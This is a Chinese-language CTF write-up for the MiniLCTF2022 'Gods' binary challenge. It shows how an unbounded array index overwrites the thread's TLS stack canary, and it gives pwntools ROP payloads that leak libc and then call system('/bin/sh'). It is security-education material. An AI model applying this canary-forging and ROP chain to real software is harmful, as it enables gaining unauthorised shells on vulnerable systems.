# MiniLCTF2022 Gods Writeup

## 题目简述

64 位程序未开启 PIE，其他常见保护均开启。`main` 创建线程执行 `vuln`；线程允许两次按“排名”写入名字，但只检查 `rank>=2`，没有上界。之后又以 `%72s` 向 24 字节附近的名字缓冲区读入数据。数组越界写可修改线程 TLS 中的 `stack_guard`，从而为后续栈溢出同步伪造 Canary。

## 解题过程

核心写入等价于：

```c
names[rank - 1] = name;   // name 最多 7 个非零字节
```

在线程栈中，函数的 `names` 基址为 `rbp-0x40`，TLS Canary 位于 `fs+0x28`。调试得到二者差为 `0x878`：

$$
\text{rank}=\frac{(fs+0x28)-(rbp-0x40)}{8}+1
=\frac{0x878}{8}+1=272.
$$

因此第一次输入 `rank=272`，写入 7 字节固定值，便覆盖 TLS 的 `stack_guard`。稍后的 `%72s` 溢出中，把栈上 Canary 也写成相同的 7 字节并补 `\x00`，校验即可通过。第二次排名写可填普通表项，不影响利用。

第一阶段 ROP 用固定的 `pop rdi; ret` 把 `puts@GOT` 传给 `puts@PLT`，泄漏 libc 地址后返回 `vuln`：

```python
canary = b"aaaaaaa\x00"
padding = b"A" * (0x20 - 8) + canary + b"B" * 8
stage1 = padding + flat(pop_rdi, elf.got.puts, elf.plt.puts, elf.sym.vuln)
```

全局 `edit_times` 已变为 0，第二次进入 `vuln` 会直接到最终名字输入。由泄漏计算 libc 基址，再调用 `system("/bin/sh")`；在 `pop rdi` 前补一个独立 `ret` 保证栈 16 字节对齐：

```python
libc.address = leaked_puts - libc.sym.puts
stage2 = padding + flat(ret, pop_rdi, next(libc.search(b"/bin/sh\0")), libc.sym.system)
```

当前官方仓库未保留 Gods 二进制，固定 `pop rdi` 地址和 libc 偏移必须从比赛附件重新取得；数组偏移 272、两阶段状态变化和利用结构由多份独立赛后脚本一致确认。

## 方法总结

线程栈把普通调用栈和 TLS 放在可预测的相对位置，使越界数组索引可以直接改 `fs:0x28` 的 Canary 源值。只改栈副本或只改 TLS 都会失败，两处必须相同。第一次 ROP 泄漏后返回原函数，第二次利用全局次数耗尽的状态跳过写表阶段，是完整利用链的重要细节。
